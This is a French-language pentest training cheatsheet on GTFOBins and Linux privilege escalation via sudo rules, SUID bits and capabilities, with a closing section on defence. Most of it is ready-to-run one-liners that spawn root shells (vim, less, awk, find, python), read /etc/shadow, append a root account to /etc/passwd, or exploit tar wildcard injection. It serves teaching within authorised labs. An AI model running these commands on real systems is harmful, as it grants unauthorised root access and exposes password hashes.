# Cheatsheet — GTFOBins

Répertoire des binaires Unix « légitimes » détournables pour contourner une restriction locale : obtenir un shell, lire/écrire un fichier hors de ses droits, ou **élever ses privilèges**. Le réflexe du module 6 (Linux).

> ⚠️ **Cadre.** Labs et périmètres autorisés uniquement. Un binaire détourné en mission est **documenté** (piste + correctif).

**Le site** : [gtfobins.github.io](https://gtfobins.github.io). Chercher le binaire → lire la ou les fonctions qui s'appliquent à ta situation.

---

## 1. L'idée en une phrase

Beaucoup d'outils Unix savent, en passant, exécuter une commande ou lire/écrire un fichier. Si un tel binaire tourne avec **des droits qui ne sont pas les tiens** (via `sudo`, un bit **SUID**, ou une **capability**), tu hérites de ces droits.

C'est pour ça que linux-privesc.md dit : un binaire inhabituel en `sudo -l`, en SUID (`find -perm -4000`) ou avec capability (`getcap`) → **on va voir sa page GTFOBins**.

---

## 2. Les « fonctions » (catégories) à connaître

Chaque page GTFOBins liste ce que le binaire sait faire. Les plus utiles :

| Fonction | Ce qu'elle permet | Où ça sert |
| --- | --- | --- |
| **Shell** | Ouvrir un shell | Sortir d'un shell restreint |
| **Command** | Exécuter une commande arbitraire | Idem |
| **Sudo** | Exploiter une règle `sudo` | `sudo -l` te l'autorise → root |
| **SUID** | Exploiter le bit SUID | binaire SUID root → root |
| **Capabilities** | Exploiter `cap_setuid` etc. | binaire avec capability |
| **File read** | Lire un fichier hors droits | lire `/etc/shadow` |
| **File write** | Écrire un fichier hors droits | modifier `/etc/passwd` |
| **File upload/download** | Transférer un fichier | exfiltration / dépôt |
| **Bind/Reverse shell** | Ouvrir un shell réseau | pivot |
| **Library load** | Charger une bibliothèque | LD_PRELOAD |

> La **même** page combine souvent plusieurs fonctions : `find` a Shell, Sudo, SUID, File read/write…

---

## 3. Les trois scénarios d'élévation

### a) Via `sudo` (le plus fréquent)
```bash
sudo -l                    # « (root) NOPASSWD: /usr/bin/find » ?
# → page GTFOBins de find, section "Sudo"
sudo find . -exec /bin/sh \; -quit
```

### b) Via un bit SUID
```bash
find / -perm -4000 -type f 2>/dev/null   # binaire SUID root inhabituel ?
# → section "SUID" de sa page. Il faut souvent préserver l'UID :
./binaire ...              # commande donnée par GTFOBins (parfois avec -p)
```

### c) Via une capability
```bash
getcap -r / 2>/dev/null    # ex. /usr/bin/python3 = cap_setuid+ep
# → section "Capabilities"
./python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'
```

---

## 4. Exemples classiques (à reconnaître d'instinct)

```bash
# --- Shell / évasion ---
sudo vim -c ':!/bin/sh'
sudo less /etc/profile      # puis  !/bin/sh
sudo awk 'BEGIN{system("/bin/sh")}'
sudo find . -exec /bin/sh \; -quit
sudo env /bin/sh
sudo nmap --interactive     # (vieilles versions)  puis  !sh

# --- via éditeurs / pagers ---
sudo man man                # puis  !/bin/sh
sudo ftp                    # puis  !/bin/sh

# --- langages ---
sudo python3 -c 'import os;os.system("/bin/sh")'
sudo perl -e 'exec "/bin/sh";'

# --- File read (lire un fichier protégé) ---
sudo cat /etc/shadow
LFILE=/etc/shadow; sudo base64 "$LFILE" | base64 -d
sudo xxd /etc/shadow | xxd -r

# --- File write (ex. tar/cp/tee en sudo) ---
LFILE=/etc/passwd; echo 'r00t:...:0:0::/root:/bin/bash' | sudo tee -a "$LFILE"

# --- SUID (préserver les droits) ---
# bash SUID :
./bash -p
# cp SUID → écraser /etc/passwd, etc.
```

> Ces commandes sont **des modèles** : toujours prendre la version exacte de la page GTFOBins (la syntaxe varie selon le binaire et sa version).

---

## 5. Wildcards & cas voisins

GTFOBins couvre aussi des abus liés aux **jokers** dans des scripts (ex. `tar`/`rsync` avec `*` dans un cron root — *wildcard injection*). Si tu vois un cron root avec un `*`, pense à cette famille (voir aussi linux-privesc.md §cron).

```bash
# tar wildcard injection (principe)
echo 'cmd' > shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
# quand le cron root fait "tar czf backup.tar.gz *" → exécution
```

---

## 6. Utiliser GTFOBins hors-ligne / vite

```bash
# Client CLI communautaire (à installer selon la distro)
gtfo find sudo
# Sinon : cloner le dépôt pour l'avoir en lab sans réseau
git clone https://github.com/GTFOBins/GTFOBins.github.io
```
Cousins à connaître : **LOLBAS** (équivalent Windows — binaires signés Microsoft détournables), **GTFOArgs** (abus d'arguments).

---

## 7. Méthode (le réflexe module 6)

```
1. Énumérer :  sudo -l  ·  find -perm -4000  ·  getcap -r /
2. Pour chaque binaire suspect → sa page GTFOBins
3. Choisir la fonction qui correspond (Sudo / SUID / Capabilities…)
4. Adapter la commande exacte
5. Documenter : piste, preuve, et CORRECTIF
```

---

## 8. Côté défense

- **Retirer** les SUID/SGID inutiles (`chmod u-s`), les capabilities superflues (`setcap -r`).
- **Règles sudo minimales** : jamais un binaire interactif/évasif en NOPASSWD (`vim`, `less`, `find`, `awk`, `tar`, langages…).
- Chemins absolus dans les scripts, pas de wildcard dangereux en cron root.
- Surveiller l'exécution anormale de ces binaires par des comptes privilégiés (auditd `execve`).

---

## 9. À savoir expliquer à l'oral

- **Le principe GTFOBins** : un binaire légitime + des droits qui ne sont pas les tiens = évasion.
- **Les trois portes** : sudo, SUID, capabilities — et la commande d'énumération de chacune.
- **Pourquoi `find`/`vim`/`awk` en sudo NOPASSWD est une faute** : ils exécutent des commandes → root immédiat.
- **LOLBAS** = l'équivalent Windows (à citer pour montrer la symétrie).
